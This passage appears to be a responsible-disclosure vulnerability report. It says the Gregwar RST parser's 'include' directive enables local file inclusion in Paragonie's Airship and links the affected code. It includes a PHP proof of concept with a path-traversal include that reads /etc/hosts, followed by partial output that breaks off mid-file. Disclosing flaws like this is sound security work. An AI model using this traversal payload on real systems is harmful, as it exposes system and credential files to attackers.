However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.\n\nI realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186\n\nhttps://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714\n\nThe parser has this problem here:\n\nhttps://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.\n\nTo demonstrate:\n\n`rst.php`:\n\n~~~\n\u003c?php\n\nrequire('autoload.php');\n\n\n$parser = new Gregwar\\RST\\Parser;\n\n// RST document\n$document = '*Test*\n\n.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts\n\n``test``\n';\n\n// Parse it\n$html = $parser-\u003eparse($document);\n\n// Render it\necho $html;\n~~~\n\nOutput:\n\n~~~\n$ php rst.php\n\u003cp\u003e\u003cem\u003eTest\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.
